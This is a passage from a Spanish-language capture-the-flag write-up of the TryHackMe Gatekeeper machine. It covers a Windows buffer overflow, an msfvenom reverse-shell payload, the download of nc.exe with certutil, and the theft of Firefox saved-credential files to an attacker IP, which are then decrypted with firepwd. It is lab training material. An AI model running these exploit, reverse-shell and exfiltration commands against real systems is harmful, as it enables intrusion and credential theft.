+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">File</span> <span class="nx">output</span> <span class="nx">to</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">shadoow</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span><span class="o">-</span><span class="nx">Users_Share_gatekeeper</span><span class="o">.</span><span class="nx">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="buffer-overflow">Buffer Overflow</h2>
+<p>Testeamos con python para comprobar si se produce un desbordamiento.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">print</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">300</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gatekeeper-thm/1.png"
+	width="1917"
+	height="266"
+	srcset="/p/gatekeeper-thm/1_hub02230f7936058a15a4cf1ed115a1b2f_46144_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/1_hub02230f7936058a15a4cf1ed115a1b2f_46144_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="720"
+		data-flex-basis="1729px"
+	
+></p>
+<p><img src="/p/gatekeeper-thm/2.png"
+	width="1898"
+	height="858"
+	srcset="/p/gatekeeper-thm/2_hu814cbc35766f66ac8b6261910a5c121d_35368_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/2_hu814cbc35766f66ac8b6261910a5c121d_35368_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="530px"
+	
+></p>
+<p>Creamos un patrón cíclico con msfpattern y lo aplicamos a la variable “payload”.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">tools</span><span class="o">/</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">pattern_create</span><span class="o">.</span><span class="nx">rb</span> <span class="o">-</span><span class="nx">l</span> <span class="mi">300</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con mona encontramos el offset exacto del EIP(Ultima instrucción a ejecutar).</p>
+<p><img src="/p/gatekeeper-thm/3.png"
+	width="1407"
+	height="772"
+	srcset="/p/gatekeeper-thm/3_hu3c946b456ea2edefa00d6bb6f830c0fe_67121_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/3_hu3c946b456ea2edefa00d6bb6f830c0fe_67121_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<p>Modificando el exploit, en la variable offset = 146 y en la variable retn = BBBB , podemos ver que tenemos el control def flujo sobre esa instrucción.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ip</span> <span class="o">=</span> <span class="s2">&#34;10.0.3.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">port</span> <span class="o">=</span> <span class="mi">31337</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">offset</span> <span class="o">=</span> <span class="mi">146</span>
+</span></span><span class="line"><span class="cl"><span class="nx">overflow</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="nx">offset</span>
+</span></span><span class="line"><span class="cl"><span class="nx">retn</span> <span class="o">=</span> <span class="s2">&#34;BBBB&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">padding</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">postfix</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con mona generamos un bytearray para encontrar los badchars.</p>
+<p><img src="/p/gatekeeper-thm/4.png"
+	width="1545"
+	height="745"
+	srcset="/p/gatekeeper-thm/4_hu27380513faf07e3d100aa622bdd9b74b_87223_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/4_hu27380513faf07e3d100aa622bdd9b74b_87223_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+></p>
+<p>Con python los generamos y los ponemos en la variable “payload”.</p>
+<p>Script Badchars:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">x</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x&#34;</span> <span class="o">+</span> <span class="s2">&#34;{:02x}&#34;</span><span class="o">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">x</span><span class="p">),</span> <span class="nx">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gatekeeper-thm/5.png"
+	width="1342"
+	height="402"
+	srcset="/p/gatekeeper-thm/5_hufe39d5c14340d074494ea8d4588854b5_64607_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/5_hufe39d5c14340d074494ea8d4588854b5_64607_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="801px"
+	
+></p>
+<p>Encontramos los bad chars, en este caso son \x00 y \x0a.</p>
+<p><img src="/p/gatekeeper-thm/6.png"
+	width="1851"
+	height="815"
+	srcset="/p/gatekeeper-thm/6_hu6fcc71668372129ab77db466684a424e_71541_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/6_hu6fcc71668372129ab77db466684a424e_71541_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="545px"
+	
+></p>
+<p>Buscamos los puntos de salto para ello podemos usar la siguiente sintaxis con mona.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">!</span><span class="nx">mona</span> <span class="nx">jmp</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">esp</span> <span class="o">-</span><span class="nx">cpb</span>  <span class="s2">&#34;</span><span class="se">\x00\xa0</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0x080414c3</span> <span class="o">-&gt;</span> <span class="na">\xc3\x14\x04\x08</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gatekeeper-thm/7.png"
+	width="1521"
+	height="522"
+	srcset="/p/gatekeeper-thm/7_hu71079d1497176c5601ef731d91851164_64666_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/7_hu71079d1497176c5601ef731d91851164_64666_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="699px"
+	
+></p>
+<p>Generamos una reverse shell con msfvenom, y lo agregamos a la variable &ldquo;payload&rdquo;.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">37.230</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1234</span> <span class="o">-</span><span class="nx">b</span> <span class="s2">&#34;</span><span class="se">\x00\x0a</span><span class="s2">&#34;</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">python</span> <span class="nx">EXITFUNC</span><span class="o">=</span><span class="nx">thread</span> <span class="o">-</span><span class="nx">v</span> <span class="nx">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">nc</span> <span class="o">-</span><span class="nx">lvnp</span> <span class="mi">1234</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>Explorando la máquina y haciendo un poco de investigación vemos que &ldquo;ljfn812a.default-release&rdquo; es un directorio que puede guardar credenciales guardadas en el navegador.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a</span><span class="o">.</span><span class="k">default</span><span class="o">-</span><span class="nx">release</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Para poder transferirnos los archivos nos podemos descargar nc.exe  y nos lo pasamos a la máquina Windows con certutil.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">://</span><span class="nx">eternallybored</span><span class="o">.</span><span class="nx">org</span><span class="o">/</span><span class="nx">misc</span><span class="o">/</span><span class="nx">netcat</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">certutil</span> <span class="o">-</span><span class="nx">f</span> <span class="o">-</span><span class="nx">urlcache</span> <span class="nx">http</span><span class="o">://&lt;</span><span class="nx">IP</span><span class="o">:</span><span class="nx">Port</span><span class="o">&gt;/</span><span class="nx">recurso</span><span class="o">.</span><span class="nx">exe</span> <span class="o">&lt;</span><span class="nx">recurso_nombre</span><span class="o">.</span><span class="nx">exe</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En windows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">nc</span><span class="o">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">nv</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">37.230</span> <span class="mi">12345</span> <span class="o">&lt;</span> <span class="nx">key4</span><span class="o">.</span><span class="nx">db</span>
+</span></span><span class="line"><span class="cl"><span class="nx">nc</span><span class="o">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">nv</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">37.230</span> <span class="mi">12345</span> <span class="o">&lt;</span> <span class="nx">logins</span><span class="o">.</span><span class="nx">json</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En nuestro kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">nc</span> <span class="o">-</span><span class="nx">lvnp</span> <span class="mi">12345</span> <span class="o">&gt;</span> <span class="nx">key4</span><span class="o">.</span><span class="nx">db</span>
+</span></span><span class="line"><span class="cl"><span class="nx">nc</span><span class="o">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">nv</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">37.230</span> <span class="mi">12345</span> <span class="o">&lt;</span> <span class="nx">logins</span><span class="o">.</span><span class="nx">json</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos descargamos firepw.py, es una herramienta que nos permite extraer las credenciales guardadas de un navegador con los archivos transferidos anteriormente.</p>
+<p>Nos pasamos los archivos descargados anteriormente a la carpeta “firepwd”</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">://</span><span class="nx">github</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">lclevy</span><span class="o">/</span><span class="nx">firepwd</span>
+</span></span><span class="line"><span class="cl"><span class="nx">instalamos</span> <span class="nx">lo</span> <span class="nx">requirements</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pip</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="o">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">python3</span> <span class="nx">firepw</span><span class="o">.</span><span class="nx">py</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lo ejecutamos:</p>
+<p><img src="/p/gatekeeper-thm/8.png"
+	width="1017"
+	height="223"
+	srcset="/p/gatekeeper-thm/8_hu4d143b53999c226110e01bff6752816b_48610_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/8_hu4d143b53999c226110e01bff6752816b_48610_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="456"
+		data-flex-basis="1094px"
+	
+></p>
+<p>Accedemos por RDP y obtenemos la flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">xfreerdp</span> <span class="o">/</span><span class="nx">u</span><span class="o">:</span><span class="nx">mayor</span> <span class="o">/</span><span class="nx">p</span><span class="o">:</span><span class="s1">&#39;***************&#39;</span> <span class="o">/</span><span class="nx">cert</span><span class="o">:</span><span class="nx">ignore</span> <span class="o">/</span><span class="nx">v</span><span class="o">:</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gatekeeper-thm/9.png"
+	width="1307"
+	height="706"
+	srcset="/p/gatekeeper-thm/9_hu8046e9f98d16743ced13b8d7069ffcce_98691_480x0_resize_box_3.png 480w, /p/gatekeeper-thm/9_hu8046e9f98d16743ced13b8d7069ffcce_98691_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/brainpain-thm/">
+        
+        
+            <div class="article-image">
+                <img src="/p/brainpain-thm/logo.d1c3bb54d1a8b03bca1e8addc256aac4.png" 
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Brainpain"
+                        data-key="brainpain-thm" 
+                        data-hash="md5-0cO7VNGosDvKHordwlaqxA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Write Up Brainpain</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/blog-thm/">
+        
+        
+            <div class="article-image">
+                <img src="/p/blog-thm/logo.c2c55f16ec47fbb414fee2049a9303ac.png" 
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Blog"
+                        data-key="blog-thm" 
+                        data-hash="md5-wsVfFuxH&#43;7QU/uIEmpMDrA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Write Up Blog</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 S.x1v4n
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
